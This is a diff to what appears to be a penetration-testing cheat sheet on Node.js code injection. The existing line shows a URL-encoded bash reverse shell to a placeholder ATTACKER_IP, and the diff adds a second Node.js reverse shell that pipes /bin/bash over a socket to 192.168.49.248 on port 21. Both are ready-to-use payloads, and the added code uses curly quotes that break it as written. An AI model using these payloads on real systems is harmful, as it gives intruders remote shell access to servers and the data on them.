@@ -22,3 +22,21 @@ If this is the case, try to get a reverse shell with this:
 ```
 require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT}+0>%261"')
 ```
+
+
+or:
+
+```
+(function(){
+ var net = require(“net”),
+ cp = require(“child_process”),
+ sh = cp.spawn(“/bin/bash”, []);
+ var client = new net.Socket();
+ client.connect(21, “192.168.49.248”, function(){
+ client.pipe(sh.stdin);
+ sh.stdout.pipe(client);
+ sh.stderr.pipe(client);
+ });
+ return /a/;
+})();
+```
